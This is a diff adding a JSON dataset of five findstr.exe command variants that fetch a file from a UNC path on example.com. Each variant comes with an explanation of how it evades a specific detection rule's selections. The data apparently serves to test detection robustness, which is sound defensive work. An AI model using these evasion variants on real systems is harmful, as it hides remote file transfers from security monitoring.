@@ -1,0 +1,22 @@
+[
+  {
+    "output": "findstr.exe /v /l \"TEST-HOST\" \\\\example.com\\share\\test.txt",
+    "explanation": "Omission technique: The provided true positive test command inadvertently utilized a single leading backslash for the remote target ('\\example.com\\...'), whereas the rule explicitly searches for a standard UNC path sequence ('\\\\\\\\') via 'selection_cli_download_3'. While the provided test context might rely on specific shell resolving behaviors, explicit usage of a properly formed UNC structure will functionally ensure a true remote connection while executing within the logic bounds of the target rule."
+  },
+  {
+    "output": "findstr.exe \"-v\" \"-l\" \"TEST-HOST\" \\\\example.com\\share\\test.txt",
+    "explanation": "Substitution and Insertion technique: Interchanging the forward slashes ('/') with hyphens ('-') while simultaneously encapsulating them inside literal double quotes ('\"-v\"' and '\"-l\"'). This effectively disables the 'windash' modifier constraints within 'selection_cli_download_1' and 'selection_cli_download_2' that monitor raw, unquoted dash characters flanked by space delimiters, while the Win32 subsystem unquotes parameters cleanly at initialization."
+  },
+  {
+    "output": "cmd.exe /c findstr.exe /v^  /l^  \"TEST-HOST\" \\\\example.com\\share\\test.txt",
+    "explanation": "Insertion technique: Routing the execution through cmd.exe permits the placement of a caret escape operator ('^') within the trailing whitespace segments following the switches. The command processor strips this character away upon instantiation, causing the process log string to record '/v^  /l^  ' which successfully evades the strict single-space padding assumptions configured around the switch monitors."
+  },
+  {
+    "output": "findstr.exe\t/v\t/l\t\"TEST-HOST\"\t\\\\example.com\\share\\test.txt",
+    "explanation": "Substitution technique: Substituting structural space characters with horizontal tab characters ('\\t'). The native Windows operating system tokenizes horizontal tabs as valid whitespace parameter boundary delimiters, achieving identical application remote file download capability while completely breaking the literal single-space tracking buffers required by ' -v ' and ' -l '."
+  },
+  {
+    "output": "findstr.exe /vl \"TEST-HOST\" \\\\example.com\\share\\test.txt",
+    "explanation": "Other techniques (Flag Grouping/Consolidation): Consolidating multiple standalone short switches into a single grouped command token argument cluster ('/vl'). Findstr natively handles multi-switch grouping parameters seamlessly, allowing the execution to proceed identically while avoiding the individual, distinct substring validations for both ' -v ' and ' -l '."
+  }
+]
